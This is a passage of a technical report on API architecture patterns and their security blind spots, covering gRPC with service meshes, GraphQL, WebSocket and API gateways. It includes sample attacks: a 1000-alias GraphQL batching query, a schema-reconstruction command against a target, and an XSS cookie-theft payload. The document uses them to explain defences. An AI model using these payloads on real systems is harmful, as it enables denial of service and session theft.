Source: Datadog, gRPC at Datadog, https://www.datadoghq.com/blog/grpc-at-datadog/

---

## 2. gRPC + Kubernetes ingress (north-south)

### 2.1 The standard pattern

To expose gRPC services to clients outside the cluster (north-south traffic), a Kubernetes ingress controller handles
TLS termination and routing to the gRPC backends.

The architectural flow:

```
[External gRPC client - Internet]
    ↓ (HTTPS/HTTP2 - port 443)
[Cloud load balancer (AWS ALB / Azure AppGW)]
    ↓ (TLS termination)
[Kubernetes ingress controller - Nginx/Envoy]
    ↓ (Routing by hostname/path)
    ↓ (Backend protocol: gRPC)
[Kubernetes Service - ClusterIP]
    ↓ (Internal load balancing)
[gRPC server pod]
```

### 2.2 Nginx ingress controller configuration

The Nginx ingress controller needs a specific annotation to handle gRPC traffic correctly:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: grpc-ingress
  annotations:
    nginx.ingress.kubernetes.io/backend-protocol: "GRPC"
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
spec:
  ingressClassName: nginx
  rules:
    - host: grpc.example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: grpc-server
                port:
                  number: 9090
  tls:
    - hosts:
        - grpc.example.com
      secretName: grpc-tls-cert
```

The annotation `backend-protocol: "GRPC"` configures Nginx to:

- use HTTP/2 to talk to the backend;
- not modify HTTP/2-specific headers (`:authority`, `:path`);
- preserve gRPC metadata (HTTP/2 trailers).

Source: Kubernetes ingress-nginx, gRPC example, https://kubernetes.github.io/ingress-nginx/examples/grpc/

Without this annotation, Nginx treats the traffic as standard HTTP/1.1, and gRPC requests fail with "protocol error".

### 2.3 AWS Application Load Balancer (ALB)

AWS ALB supports gRPC natively but needs configuration through AWS Load Balancer Controller annotations:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    alb.ingress.kubernetes.io/backend-protocol-version: "GRPC"
    alb.ingress.kubernetes.io/healthcheck-protocol: HTTP
    alb.ingress.kubernetes.io/healthcheck-path: /healthz
    alb.ingress.kubernetes.io/ssl-redirect: "443"
spec:
  # ... rules
```

A peculiarity of ALB: the health check MUST use HTTP (not gRPC), because ALB does not support the gRPC health check
protocol. The backend must expose a separate HTTP `/healthz` endpoint for health checks, besides the main gRPC service.

Source: AWS Prescriptive Guidance, gRPC on Amazon EKS with ALB,
https://docs.aws.amazon.com/prescriptive-guidance/latest/patterns/deploy-a-grpc-based-application-on-an-amazon-eks-cluster-and-access-it-with-an-application-load-balancer.html

gRPC traffic is terminated at the ALB (TLS decryption), then forwarded to the backend Kubernetes Service as plain
HTTP/2. So the internal VPC network carries unencrypted gRPC, relying on VPC isolation for security.

---

## 3. GraphQL + Apollo Federation gateway

### 3.1 The standard pattern

GraphQL in microservice architectures typically uses Apollo Federation: each microservice exposes a GraphQL subgraph
(a partial schema), and the Apollo gateway composes the subgraphs into a unified supergraph exposed to clients.

The federated architecture:

```
[Client - mobile/web app]
    ↓ (Single GraphQL query)
[Apollo gateway - supergraph router]
    ↓ (Query planning - analyse the query, split it into sub-queries)
    ↓
    ├─→ [Subgraph A - products service] (GraphQL endpoint: /graphql)
    ├─→ [Subgraph B - reviews service] (GraphQL endpoint: /graphql)
    └─→ [Subgraph C - users service] (GraphQL endpoint: /graphql)
    ↓
[Gateway - response composition]
    ↓ (Merge the results of several subgraphs)
[Client] ← (Single unified GraphQL response)
```

### 3.2 Federation mechanism

Each subgraph defines its own GraphQL schema with special directives to mark shared entities. For example, the
products subgraph defines:

```graphql
type Product @key(fields: "id") {
  id: ID!
  name: String!
  price: Float!
}
```

The annotation `@key(fields: "id")` states that Product is an entity uniquely identified by `id`, and other subgraphs
can reference it.

The reviews subgraph extends Product:

```graphql
extend type Product @key(fields: "id") {
  id: ID! @external
  reviews: [Review!]!
}
```

This declares that the reviews service can provide the `reviews` field for a Product, given its `id`.

Source: Apollo GraphQL, Introduction to Apollo Federation, https://www.apollographql.com/docs/federation

When the client sends the query:

```graphql
query {
  product(id: "123") {
    name    # from the products subgraph
    price   # from the products subgraph
    reviews { # from the reviews subgraph
      rating
      text
    }
  }
}
```

the Apollo gateway runs this workflow:

1. **Query planning**: analyses the query and determines which subgraphs must be queried.
2. **Parallel execution**: sends a query to the products subgraph to get `name` and `price`.
3. **Entity resolution**: receives the products response, extracts `id: "123"`.
4. **Dependent query**: sends a query to the reviews subgraph: "give me the reviews for product id=123".
5. **Response merging**: combines the data of both subgraphs into one JSON response.

Source: Contentful, Understanding federated GraphQL, https://www.contentful.com/blog/understanding-federated-graphql/

This approach lets teams develop subgraphs independently while keeping a unified client interface.

### 3.3 Architectural best practices

Netflix's documentation (pioneers of GraphQL Federation) stresses a **top-down** approach instead of bottom-up:

"Think of a federated Graph top down, not bottom up. You cannot have individual teams build their Subgraphs in full
isolation and merge them 'upwards' into a Supergraph. This will not scale well from an organizational perspective."

Source: GraphQL API Gateway Guide, federation pattern,
https://graphql-api-gateway.com/graphql-api-gateway-patterns/graphql-federation

This means: define the supergraph schema first (the public API), then split it into subgraphs. Not the other way round
(each team creates its own schema and then a merge is attempted).

The gateway also needs a **schema registry**: a central repository where each subgraph publishes its schema. The
gateway reads the registry to compose the supergraph. Changes to a subgraph schema must be validated against the
supergraph to avoid breaking changes.

---

## 4. WebSocket + AWS API Gateway serverless

### 4.1 The standard pattern

The AWS API Gateway WebSocket API integrates persistent WebSocket connections with serverless Lambda backends, solving
the state problem with DynamoDB.

The serverless architecture for WebSocket:

```
[WebSocket client - browser/mobile]
    ↓ (wss://xyz.execute-api.region.amazonaws.com/production)
[AWS API Gateway WebSocket API]
    ↓ (HTTP handshake → Lambda authorizer for authentication)
    ↓
[Lambda: $connect] ← (Triggered when the connection is established)
    ↓ (Store the connection ID in a DynamoDB table)
[DynamoDB table: Connections]
    { connectionId: "abc123", userId: "user_456", timestamp: ... }
    ↓
[WebSocket connection active]
    ↓
[Client sends a message]
    ↓
[API Gateway] → [Lambda: $default] (message handler)
    ↓ (Process the message, query DynamoDB for user data)
    ↓ (Send the response through the @connections API)
[Client] ← (Server response through the WebSocket)
    ↓
[Connection close]
    ↓
[Lambda: $disconnect] ← (Cleanup: delete the connection from DynamoDB)
```

### 4.2 Connection management

The central pattern is tracking WebSocket connections in DynamoDB. Each connection gets a unique `connectionId`
generated by API Gateway. The `$connect` Lambda (run during the handshake) stores this ID with user metadata:

```javascript
// Lambda $connect handler
export const handler = async (event) => {
  const connectionId = event.requestContext.connectionId;
  const userId = event.requestContext.authorizer.userId; // from the Lambda authorizer

  // Store in DynamoDB
  await dynamoDB.put({
    TableName: 'WebSocketConnections',
    Item: {
      connectionId: connectionId,
      userId: userId,
      connectedAt: Date.now()
    }
  });

  return { statusCode: 200 };
};
```

This connectionId-userId mapping then allows:

- finding all the connections of a specific user;
- sending push messages to a specific user (even with several connections);
- cleanup when the user disconnects.

Source: Modus Create, Building a WebSocket server with AWS API Gateway,
https://www.moduscreate.com/blog/building-a-websocket-server-using-aws-api-gateway

### 4.3 Server-to-client push

To send messages from the backend to the client, a Lambda uses the `@connections` API:

```javascript
// Lambda sending a message to a specific client
const apiGatewayManagementApi = new AWS.ApiGatewayManagementApi({
  endpoint: 'https://xyz.execute-api.region.amazonaws.com/production'
});

await apiGatewayManagementApi.postToConnection({
  ConnectionId: 'abc123',
  Data: JSON.stringify({ type: 'notification', message: 'Hello' })
}).promise();
```

This mechanism allows pub/sub patterns: when an event happens (for example a new comment on a post), a Lambda queries
DynamoDB for every interested connectionId and pushes to each.

Source: Medium, AWS API Gateway deep dive (WebSocket API),
https://medium.com/@joudwawad/aws-api-gateway-deep-dive-websocket-api-a00558fa40e1

### 4.4 Validation and security

A best practice documented by AWS: validate at route level before invoking the Lambda:

"You can configure API Gateway to perform validation on a route request before proceeding with the integration
request. If the validation fails, API Gateway fails the request without calling your backend, sends a 'Bad request
body' gateway response to the client, and publishes the validation results in CloudWatch Logs."

Source: Medium, AWS API Gateway deep dive (WebSocket API),
https://medium.com/@joudwawad/aws-api-gateway-deep-dive-websocket-api-a00558fa40e1

This prevents useless Lambda invocations for malformed payloads, reducing cost and backend load.

---

## 5. REST + cloud API gateway (the universal pattern)

### 5.1 The standard pattern

REST behind a managed API gateway (AWS API Gateway, Azure API Management, GCP API Gateway) is the most widespread
pattern for exposing APIs to external clients. The gateway centralises authentication, rate limiting, logging, and
routing.

The standard architecture:

```
[REST client - public Internet]
    ↓ (HTTPS - port 443)
[Cloud API gateway]
    ↓ (TLS termination)
    ↓ (Authentication: JWT validation / API key check)
    ↓ (Rate limiting: token bucket per client ID)
    ↓ (Request transformation: header injection, path rewrite)
    ↓ (Routing: /users → user service, /products → product service)
[Backend microservices - private VPC network]
    ↓ (Plain HTTP or internal mTLS)
[Database / cache / storage]
```

### 5.2 Multi-layer authentication

An API gateway typically authenticates in layers:

**Layer 1, API keys**: client identification (who is calling the API), not user authentication. Used for rate limiting
and analytics.

**Layer 2, JWT validation**: user authentication. The gateway validates the JWT signature, checks the expiry, extracts
the claims (userId, roles).

**Layer 3, custom authorizer** (Lambda authorizer in AWS, policy in Azure): complex authorization logic. It can query a
database to check fine-grained permissions.

The complete flow:

```
[Client request]
  Headers: {
    X-API-Key: "abc123",
    Authorization: "Bearer eyJhbGciOiJIUzI1..."
  }
    ↓
[Gateway - API key validation]
  Check that abc123 exists and is not revoked
    ↓
[Gateway - JWT validation]
  Decode the JWT, verify the HMAC/RSA signature
  Check the exp claim (token not expired)
  Extract the userId from the claims
    ↓
[Gateway - custom authorizer (optional)]
  The Lambda receives { userId, resource, method }
  Queries DynamoDB for the user's permissions
  Returns { "allow": true/false }
    ↓
[Gateway - route to backend]
  Injects the X-User-Id header for the backend
  The backend need not validate auth (it trusts the gateway)
```

This pattern separates responsibilities: the gateway handles authentication/authorization, the backend implements the
business logic.

Source: Azure Architecture Center, API gateways,
https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway

### 5.3 Rate limiting patterns

An API gateway implements rate limiting with the **token bucket algorithm**:

- each client has a bucket of N tokens;
- each request consumes 1 token;
- the bucket refills at R tokens per second;
- when the bucket is empty, requests are rejected (429 Too Many Requests).

A typical AWS API Gateway configuration:

- burst limit: 100 requests (bucket capacity);
- steady-state limit: 50 requests per second (refill rate).

This allows temporary spikes (bursts up to 100 requests) but limits sustained throughput to 50 requests per second.

Source (as cited in the thesis): Kong Gateway documentation, https://developer.konghq.com/gateway/

Rate limiting can be applied per:

- API key (each client has its own quota);
- IP address (anonymous users);
- user ID (taken from the JWT).

---

## 6. Serverless API (Lambda + API Gateway)

### 6.1 The standard pattern

The AWS Lambda + API Gateway REST integration is the apotheosis of serverless: zero server management, automatic
auto-scaling, pay per invocation.

The end-to-end flow:

```
[Client request: GET /users/123]
    ↓
[API Gateway REST API]
    ↓ (Route: GET /users/{id} → Lambda function getUserById)
    ↓ (Lambda proxy integration)
[AWS Lambda - cold start check]
    If the function has not run recently:
      ↓ (Provision the micro-VM)
      ↓ (Download the code from S3)
      ↓ (Initialise the runtime - Python/Node/Java)
      ↓ (Run the handler's initialisation code)
    Otherwise (warm):
      ↓ (Reuse the existing environment)
[Lambda execution]
    ↓ (The handler function receives the event object)
    Event: {
      "httpMethod": "GET",
      "path": "/users/123",
      "pathParameters": {"id": "123"},
      "headers": {...},
      "requestContext": {...}
    }
    ↓ (Business logic - query DynamoDB)
[DynamoDB query]
    GetItem(TableName="Users", Key={"id": "123"})
[Lambda response]
    Return: {
      "statusCode": 200,
      "headers": {"Content-Type": "application/json"},
      "body": "{\"id\": 123, \"name\": \"Alice\"}"
    }
    ↓
[API Gateway]
    ↓ (Transform the Lambda response into an HTTP response)
[Client] ← (HTTP 200 OK, JSON body)
```

### 6.2 Cold start mitigation

The cold start (100-500 ms of latency) is the Achilles' heel of serverless. AWS offers **provisioned concurrency** to
mitigate it:

Provisioned concurrency keeps N Lambda execution environments always warm (pre-initialised). When a request arrives,
an environment from the warm pool is used instead of a cold start.

Configuration:

```
ProvisionedConcurrency: 5  # 5 environments always ready
```

This reduces latency to <10 ms for requests served by warm environments, but raises costs (idle environments are paid
for).

Source: Lumigo, AWS Lambda architecture, https://lumigo.io/learn/aws-lambda-architecture/

A hybrid strategy: use provisioned concurrency only during peak hours (8am-8pm), allow cold starts at night.

### 6.3 VPC integration

Lambda can access private VPC resources (RDS databases, ElastiCache), but this requires VPC integration with a latency
trade-off.

The mechanism: Lambda creates an elastic network interface (ENI) in the VPC, allocates an IP address from the subnet,
and routes Lambda-to-VPC traffic through the ENI.

Historically (before 2019) this caused catastrophic cold starts (+10 seconds) because each invocation created new
ENIs. AWS optimised it with **Hyperplane ENI pooling**: Lambda keeps a pool of pre-created ENIs shared between
functions, reducing the overhead to ~100-200 ms.

Source: Serverless architecture patterns, https://americanchase.com/serverless-architecture-patterns/

The VPC-integrated flow:

```
[Lambda execution environment - AWS account]
    ↓ (Through the Hyperplane ENI)
[ENI in the VPC subnet - IP 10.0.1.50]
    ↓ (Security group rules apply)
[RDS database - IP 10.0.2.100]
    ↓ (Connection through VPC routing)
```

Best practice: a VPC-integrated Lambda needs a NAT gateway for Internet access (downloading dependencies, calling
external APIs). Without NAT, the Lambda can reach only VPC resources.

---

## Summary of part 1: established patterns

The physiology of architecture-protocol interactions shows established patterns that use the strengths of both
layers. gRPC on a service mesh gets automatic mTLS and Layer 7 load balancing. GraphQL Federation allows independent
microservices with a unified API. Serverless WebSocket uses DynamoDB for persistent state. REST + API gateway
centralises security.

These patterns work because they respect each other's design assumptions: the service mesh assumes HTTP/2 traffic
(gRPC provides it). The API gateway assumes stateless traffic (REST provides it). Lambda assumes short-lived execution
(REST request/response fits).

The next section analyses where these assumptions are violated, creating blind spots and emergent complexity.

---

# Part 2: Pathology, frictions and security risks

## Introduction to the pathology

When architectures and protocols work together, their design assumptions must be compatible. The problem appears
when one layer violates the other's assumptions, creating an **impedance mismatch**: the misalignment between one
component's expectations and the other's actual behaviour.

These mismatches create structural blind spots: points where standard security mechanisms fail, where configuration
best practices are inadequate, and where attack surfaces grow in non-obvious ways. They are not
implementation-specific bugs, but emergent properties of the interaction between incompatible architectural designs.

This section analyses the critical problematic interactions, identifying for each: which assumption is violated, why
traditional tools fail, and which mitigations (if any) are needed.

---

## 1. gRPC + service mesh: memory exhaustion with streaming

### 1.1 The violated assumption

The service mesh (specifically the Envoy proxy) assumes that HTTP/2 requests are **finite and relatively short**.
Envoy buffers messages in memory to implement retries, timeouts, and metrics collection. The mental model: a request
arrives, is processed in milliseconds to seconds, the response leaves, the buffer is released.

gRPC bidirectional streaming violates this assumption radically: a stream can be **infinite**. In a chat,
videoconference, or telemetry streaming application, client and server send messages continuously without ever
closing the stream.

The problem:

```
[gRPC client - streaming app]
    ↓ (Opens 1 bidirectional HTTP/2 stream)
[Envoy sidecar proxy]
    ↓ (Buffers messages in memory)
    Buffer: [msg1, msg2, msg3, ...]
    ↓ (The stream never closes)
    ↓ (Keeps buffering: msg4, msg5, ... msg1000000)
[Memory]
    Allocated: 10MB → 100MB → 500MB → 2GB → OOM kill
```

### 1.2 The technical blind spot

The problem documented by Red Hat is that the HTTP/2 circuit breaker (`http2MaxRequests`) **does not prevent** this
scenario:

"gRPC applications using bi-directional streams between client and server causes huge memory usage from istio-proxy
envoy sidecar. Even when using circuit breaker to implement `http2MaxRequests` the sidecar keeps consuming memory until
its limits. The default value of 2Gi causes the container to constantly crash."

Source: Red Hat, gRPC protocol listener on service mesh, https://access.redhat.com/solutions/6246351

The root cause: the circuit breaker counts **concurrent HTTP/2 requests**, not messages per stream.

```
Configuration:
  http2MaxRequests: 100  (max 100 concurrent streams)

Real scenario:
  10 active gRPC streams (under the limit of 100 ✓)
  × 1,000,000 messages per stream
  = 10,000,000 messages buffered in Envoy
  = memory exhaustion
```

Each stream counts as "1 request". The circuit breaker allows 100 concurrent streams, apparently safe. But if each
stream sends millions of messages, Envoy accumulates gigabytes of buffered data with no limit.

### 1.3 Documented mitigations

Red Hat documents three approaches:

**Option 1, more sidecar memory**: configure Envoy with a memory limit above 2Gi. Not always acceptable (cost,
overhead).

**Option 2, Istio ambient mode**: use a proxyless architecture that removes the sidecar for L7 traffic. ztunnel (a
Layer 4 proxy) does not buffer payloads, reducing the memory footprint.

Source: Istio blog, gRPC proxyless service mesh, https://istio.io/latest/blog/2021/proxyless-grpc/

**Option 3, application-side stream timeout**: implement a timeout in the application code (for example close the
stream after 1 hour), instead of relying on Envoy.

A critical note: none of these is a perfect "fix". They are workarounds that balance trade-offs (memory against
functionality).

---

## 2. gRPC + Istio gateway: silent protocol downgrade

### 2.1 The violated assumption

Kubernetes assumes that **the protocol can be inferred from a naming convention**. If a Service port has `name: grpc`,
tools understand that the traffic is gRPC over HTTP/2.

Istio extends this convention with an implementation detail: it supports the `appProtocol` field, but only in specific
versions. The Kubernetes Enhancement Proposal (KEP) for `appProtocol` is a draft, not a stable standard.

The problem appears when the configuration is ambiguous: a Service with neither `name: grpc` nor `appProtocol`. Istio
must decide: HTTP/1.1 or HTTP/2?

Default fallback: **HTTP/1.1**.

### 2.2 The operational blind spot

Issue documented in the Istio GitHub discussions, #53877:

"Well, I was able to narrow it down... Looks like the gateway is converting traffic to HTTP/1.1."

Source: GitHub, Istio discussion #53877, https://github.com/istio/istio/discussions/53877

The symptom: the gRPC client receives a `protocol error`, the connection fails. The developer sees only generic errors
in the logs:

```
upstream connect error or disconnect/reset before headers
```

Debugging requires a packet capture (tcpdump) to see that the Istio gateway is sending HTTP/1.1 to the backend, not
HTTP/2.

The silent downgrade:

```
[gRPC client - expects HTTP/2]
    ↓ (Sends a gRPC request)
[Istio gateway]
    ↓ (No protocol indication)
    ↓ (Default: HTTP/1.1 conversion)
    ↓ (Proxies the request as HTTP/1.1)
[gRPC server - expects HTTP/2]
    ← (Receives an HTTP/1.1 request)
    ← (Rejection: protocol error)
[Client]
    ← (Connection failed)
```

The blind spot: **no warning in the Istio logs** that a protocol downgrade happened. The operator does not know the
problem is a misconfiguration, and thinks it is an application bug or a network issue.

### 2.3 Security implications

A gRPC client assumes that the service mesh provides **automatic mTLS**. If the traffic is downgraded to HTTP/1.1, and
the HTTP/1.1 path has no mTLS configured, the communication becomes plain text.

Scenario:

```
Developer: "I deployed on Istio, mTLS is automatic, secure ✓"
Reality:   protocol downgrade → HTTP/1.1 plain text → sniffable by an attacker on the network
```

The violated assumption: "Istio = always encrypted". In reality: "Istio = encrypted if the protocol is configured
correctly".

---

## 3. GraphQL + API gateway: batching bypasses rate limiting

### 3.1 The violated assumption

An API gateway assumes that **1 HTTP request = 1 backend operation**. Rate limiting is therefore implemented by
counting HTTP requests:

```
Configuration:
  Rate limit: 100 requests/second per API key

Logic:
  If (request_count > 100 in current_second):
    Return 429 Too Many Requests
```

GraphQL batching/aliasing violates this assumption: **1 HTTP request = N backend operations**.

### 3.2 The architectural blind spot

A documented attack scenario:

```
POST /graphql

{
  "query": "query BatchAttack {
    user1: user(id: 1) { name email }
    user2: user(id: 2) { name email }
    user3: user(id: 3) { name email }
    ...
    user1000: user(id: 1000) { name email }
  }"
}
```

This is **1 HTTP POST request**. The gateway's rate limiter counts: "1 request, OK".

The GraphQL backend runs 1000 resolver calls for the `user(id: ...)` field, each querying the database.

The attack:

```
[Attacker]
    ↓ (1 HTTP POST /graphql)
[API gateway - rate limiter]
    Counter: 1 request ✓ (under the limit of 100/s)
    ↓ (Forward to the backend)
[GraphQL server]
    ↓ (Parse the query, find 1000 aliases)
    ↓ (Run 1000 resolver functions)
        ├→ DB query 1
        ├→ DB query 2
        ...
        └→ DB query 1000
[Database]
    Overload → slow queries → timeout
```

Escape Tech's documentation confirms:

"GraphQL APIs allow batching and aliasing, where multiple queries can be sent in a single HTTP request. This can be
exploited to bypass rate limits set at the gateway or firewall level."

Source: Escape Tech, How to secure GraphQL APIs, https://escape.tech/blog/how-to-secure-graphql-apis/

### 3.3 Computing the bypass

If the rate limit is 100 requests per second, an attacker can:

```
100 HTTP requests/s
× 1000 GraphQL queries per request (batching)
= 100,000 backend operations/s
```

A bypass of 1000 times the intended rate limit.

### 3.4 Required mitigation

Traditional rate limiting (Nginx `limit_req`, AWS API Gateway throttling) **does not protect**. **Query complexity
analysis** is needed:

The GraphQL server must:

1. parse the query into an abstract syntax tree (AST);
2. compute the computational cost (each field has a weight, nesting multiplies);
3. reject queries whose cost exceeds a threshold.

An example of cost:

```
user (cost: 1)
  posts (cost: 10, multiplied for each user)
    comments (cost: 5, multiplied for each post)

Query: user { posts { comments } }
Total cost: 1 user × 10 posts × 5 comments = 50
```

This needs a GraphQL-aware gateway or application-side middleware. Traditional infrastructure does not have this
capability.

---

## 4. GraphQL introspection: schema leakage behind the gateway

### 4.1 The violated assumption

GraphQL security best practice: **disable introspection in production**.

The API gateway assumes that if introspection is disabled, the schema is secret.

The reality: the schema can be rebuilt through **field suggestions**, regardless of introspection.

### 4.2 The bypass mechanism

GraphQL gives helpful error messages for developer experience:

```
query { user { invalidFieldName } }

Response:
{
  "errors": [{
    "message": "Cannot query field 'invalidFieldName' on type 'User'.
                Did you mean 'username', 'email', or 'firstName'?"
  }]
}
```

This error message **leaks valid fields**.

An attacker can iterate:

```
Try 1: user { a } → "Did you mean 'admin', 'age'?"
Try 2: user { b } → "Did you mean 'balance'?"
Try 3: user { c } → "Did you mean 'creditCard'?"
...
```

After N attempts, the attacker has rebuilt every field name.

The open source tool **Clairvoyance** automates this:

```
clairvoyance -o schema.json https://target.com/graphql
# Output: full schema reconstructed via field suggestion
```

Source: Cyber Chief, Mastering GraphQL introspection, https://www.cyberchief.ai/2024/11/graphql-security.html

### 4.3 Explicit documentation of the problem

Cyber Chief documents:

"While disabling introspection may seem like a security measure, it's largely ineffective. Your GraphQL schema remains
discoverable through other means, particularly through Field Suggestion - a feature present in most GraphQL engines."

Source: Cyber Chief, Mastering GraphQL introspection, https://www.cyberchief.ai/2024/11/graphql-security.html

The blind spot: **the API gateway cannot block field suggestions** without parsing GraphQL response errors. The gateway
sees only an HTTP 200 response with a JSON body. It cannot tell "a valid response" from "an error message that leaks
the schema".

---

## 5. WebSocket + API gateway: rate limiting after the handshake

### 5.1 The violated assumption

The API gateway assumes **stateless HTTP request/response** traffic. Rate limiting counts discrete HTTP requests.

WebSocket violates this assumption: **1 HTTP handshake, N frames with no further HTTP requests**.

### 5.2 The structural blind spot

AWS API Gateway documentation:

"API Gateway throttles requests using the token bucket algorithm, where a token counts for a request. Specifically,
API Gateway examines the rate and burst of request submissions."

Source: AWS API Gateway, Protect WebSocket APIs,
https://docs.aws.amazon.com/apigateway/latest/developerguide/websocket-api-protect.html

The critical keyword: "**request submissions**" = HTTP requests.

The attack:

```
[Attacker]
    ↓ (Establishes 100 WebSocket connections)
    ↓ (100 HTTP handshake requests)
[API gateway rate limiter]
    Counter: 100 requests ✓ (under a limit of, say, 1000/s)
    ↓ (Connections established)
[WebSocket connections active]
    ↓ (The attacker sends 1000 frames/s per connection)
    ↓ (100 connections × 1000 frames = 100,000 frames/s)
[API gateway]
    ← (Does NOT count frames as "requests")
    ← (The rate limiter is unaware)
[Backend Lambda]
    ← (Receives 100,000 messages/s)
    ← (Overload)
```

### 5.3 Implication for testing

Tools that test rate limiting by counting HTTP requests (Burp Intruder, OWASP ZAP) **fail completely** on WebSocket.

Test scenario:

```
Tool: sends 1000 HTTP requests → 429 Too Many Requests ✓
Tool: sends 1000 WebSocket frames → all accepted ✗

The tool's wrong conclusion: "rate limiting OK"
Reality: rate limiting bypassed through WebSocket
```

### 5.4 Required mitigation

Rate limiting for WebSocket requires an **application-level implementation**:

```javascript
// Lambda $default (message handler)
const messageCount = await getMessageCount(connectionId);

if (messageCount > 100) { // 100 messages/min per connection
  // Disconnect the client
  await apiGateway.deleteConnection({ ConnectionId: connectionId });
  return { statusCode: 429 };
}

await incrementMessageCount(connectionId);
// Process the message...
```

This needs a DynamoDB query for every message (latency overhead), but it is the only way to enforce the limit.

---

## 6. WebSocket + API gateway: structural WAF bypass

### 6.1 The violated assumption

A web application firewall (WAF) inspects the **HTTP request/response payload** to identify attack patterns (XSS,
SQLi, RCE).

WebSocket, after the HTTP handshake, uses a **binary frame protocol** that the WAF cannot inspect.

### 6.2 Explicit documentation of the blind spot

Azure API Management documentation:

"WebSocket APIs can be secured by applying API Management's access control policies to the **initial handshake
operation**."

Source: Microsoft Learn, Import a WebSocket API to Azure API Management,
https://learn.microsoft.com/en-us/azure/api-management/websocket-api

The keyword: "**initial handshake operation**" = only the HTTP upgrade, NOT the frames that follow.

Azure Application Gateway documentation is even more explicit:

"After a connection is upgraded to WebSocket, as an intermediary/terminating proxy, Application Gateway will simply
send the data received from the frontend to the backend and vice-versa, **without any inspection or manipulation
capability**. Therefore, the Web Application Firewall (WAF) **cannot parse any content and doesn't perform any
inspections** on such data."

Source: Microsoft Learn, WebSocket support in Azure Application Gateway,
https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-websocket

### 6.3 Attack scenario

```
[Attacker]
    ↓ (HTTP handshake with a valid JWT)
[API gateway + WAF]
    ↓ (Validates the JWT ✓)
    ↓ (The WAF inspects the HTTP request ✓)
    ↓ (Upgrade to WebSocket approved)
[WebSocket connection established]
    ↓
[The attacker sends a WebSocket frame]
    Payload: {"message": "<script>alert(document.cookie)</script>"}
    ↓
[WAF]
    ← (Sees a binary WebSocket frame)
    ← (Cannot inspect the payload - the XSS passes unnoticed)
[Backend]
    ← (Processes the message, stores it in the DB)
    ← (Stored XSS vulnerability)
```

The WAF is **structurally blind** to WebSocket frames after the upgrade.

### 6.4 Architectural implication

There is no infrastructure-level solution. Security must be implemented in the application code:

- the backend must validate and sanitise every WebSocket frame payload;
- it cannot delegate this to the WAF or gateway.

This violates the principle of separation of concerns (infrastructure handles security, the application handles
business logic).

---

## 7. WebSocket + AWS API Gateway: logging truncation

### 7.1 The violated assumption

The API gateway assumes that **log entries are bounded** (of a reasonable, limited size).

A WebSocket frame can be up to **32 KB** (the AWS limit), but AWS API Gateway truncates log events sent to CloudWatch
Logs at **1024 bytes**.

### 7.2 The forensic blind spot

A documented AWS API Gateway limitation:

"API Gateway currently limits log events to 1024 bytes. Log events larger than 1024 bytes, such as request and
response bodies, will be truncated."

Source: AWS API Gateway, important notes,
https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-known-issues.html

The problem in numbers:

```
WebSocket frame max size: 32 KB = 32,768 bytes
CloudWatch log entry: 1024 bytes
Percentage logged: 1024 / 32768 = 3.125%
Percentage LOST: 96.875%
```

The blind spot:

```
[WebSocket frame]
  Size: 32 KB
  Payload: {"action": "...", "data": "<malicious payload 30KB>"}
    ↓
[API Gateway logging]
  Log entry: {"action": "...", "data": "<maliciou...  [TRUNCATED]
    ↓
[CloudWatch Logs]
  Stored: first 1024 bytes only
```

### 7.3 Implication for incident response

A post-breach investigation:

```
Security team:   "What payload did the attacker send?"
CloudWatch Logs: {"message": "Hello, I am...  [TRUNCATED]
Security team:   "96% of the payload is missing, analysis impossible"
```

Forensic analysis needs complete **application-level logging**; it cannot rely on the API gateway's logs.

---

## 8. WebSocket + AWS API Gateway: private network impossible

### 8.1 The violated assumption

A REST API can be **private** (VPC endpoint only, no Internet exposure).

A WebSocket API is **always public** (exposed to the Internet).

### 8.2 Explicit documentation of the limitation

AWS re:Post:

"WebSocket APIs in API Gateway are currently only offered with a **Regional endpoint type** and must be accessed over
the internet, which means they **cannot be made private** like REST APIs."

Source: AWS re:Post, WebSocket API Gateway security,
https://repost.aws/questions/QUV184Gf_kSHqrFNWOJswD0g/websocket-api-gateway-security-or-alternatives-for-streaming

### 8.3 Architectural implication

A problematic scenario:

```
Requirement: "internal microservices communicate over WebSocket, zero Internet exposure"

Architecture with a REST API:
[Service A in VPC] ← (VPC endpoint - private) → [Service B in VPC] ✓

Architecture with a WebSocket API:
[Service A in VPC] → (forced Internet exposure) → [WebSocket API Gateway] → [Service B in VPC] ✗
```

Internal services are **forced to expose traffic to the Internet** to use the WebSocket API Gateway.

### 8.4 Documented workaround

Deploy an ELB (Elastic Load Balancer) + ECS/EKS with a custom WebSocket server, bypassing API Gateway:

```
[Service A] → [Internal ALB - VPC only] → [ECS task - WebSocket server] → [Service B]
```

Trade-off:

- lose: the benefits of a managed service (AWS-managed auto-scaling, Lambda integration);
- gain: complete network isolation.

---

## 9. gRPC-Web transcoding: metadata loss

### 9.1 The violated assumption

Browsers do not support native gRPC (HTTP/2 binary frames with protobuf). The solution: **gRPC-Web** (a text-based
HTTP/1.1 wrapper).

The Envoy proxy (in Istio or standalone) provides automatic transcoding: it converts gRPC-Web to binary gRPC.

Assumption: transcoding is **lossless** (information is preserved).

Reality: metadata and context can be lost.

### 9.2 The operational blind spot

The transcoding flow:

```
[Browser - gRPC-Web client]
    ↓ (HTTP/1.1 POST)
    Content-Type: application/grpc-web+proto
    Payload: base64-encoded protobuf
    ↓
[Envoy sidecar - gRPC-Web filter]
    ↓ (Transcoding)
    ↓ (Decode base64)
    ↓ (Convert to binary gRPC over HTTP/2)
    ↓
[gRPC server]
    ← (Receives native gRPC)
```

The problem: **log mismatch**.

The gateway log shows:

```
POST /UserService/GetUser HTTP/1.1
Content-Type: application/grpc-web+proto
```

The backend log shows:

```
gRPC call: UserService.GetUser
Protocol: HTTP/2
```

Security monitoring sees an HTTP POST, the backend processes gRPC. Correlating gateway and backend logs is difficult.

Source: VMware blog, gRPC-Web and Istio, https://blogs.vmware.com/networkvirtualization/2019/04/grpc-web-and-istio.html/

### 9.3 Security implication

The WAF inspects the HTTP/1.1 request (gRPC-Web) and sees a base64-encoded payload. It can validate the base64
format, but **cannot parse protobuf** without the schema.

The backend receives binary gRPC and deserialises protobuf. If the protobuf carries an exploit (deserialisation
